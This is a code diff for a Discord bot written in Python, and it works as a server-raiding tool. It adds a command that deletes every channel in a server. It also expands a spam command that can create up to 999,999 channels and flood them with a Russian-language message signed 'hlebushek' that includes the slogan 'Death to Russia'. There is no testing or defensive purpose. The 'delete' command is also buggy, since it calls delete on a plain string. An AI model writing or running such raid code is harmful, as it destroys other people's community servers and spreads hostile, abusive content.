@@ -2,12 +2,10 @@ import discord
 from discord.ext import commands
 from config import settings
 import asyncio
-import time
 
 intents = discord.Intents.default()
 intents.members = True
 bot = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
-client = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
 bot.remove_command('help')
 
 
@@ -28,11 +26,19 @@ async def help(ctx):
                     
 
 @bot.command()
+async def delete(ctx, n):
+    if n != "0":
+        channel = n
+
+        await channel.delete()
+    else:
+        for c in ctx.guild.channels:
+            await c.delete()
+
+
+@bot.command()
 async def spam_server(ctx, n):
-    for line2 in range(0 , int(n)):
-        guild = ctx.message.guild
-        await guild.create_text_channel('сервер-заспамлен-by-hlebushek')
-        await ctx.channel.send('''
+    spam_text = """
 Вы были заспамлены by hlebushek! Слава Украине! Смерть России
 Вы были заспамлены by hlebushek! Слава Украине! Смерть России
 Вы были заспамлены by hlebushek! Слава Украине! Смерть России
@@ -42,7 +48,18 @@ async def spam_server(ctx, n):
 Вы были заспамлены by hlebushek! Слава Украине! Смерть России
 Вы были заспамлены by hlebushek! Слава Украине! Смерть России
 Вы были заспамлены by hlebushek! Слава Украине! Смерть России
-Вы были заспамлены by hlebushek! Слава Украине! Смерть России''')
+Вы были заспамлены by hlebushek! Слава Украине! Смерть России"""
+    
+    if n == '0':
+        for line in range(0 , 999999):
+            guild = ctx.message.guild
+            await guild.create_text_channel('сервер-заспамлен-by-hlebushek')
+            await ctx.channel.send(spam_text)
+    else:        
+        for line in range(0 , int(n)):
+            guild = ctx.message.guild
+            await guild.create_text_channel('сервер-заспамлен-by-hlebushek')
+            await ctx.channel.send(spam_text)
 
 
 @bot.command()
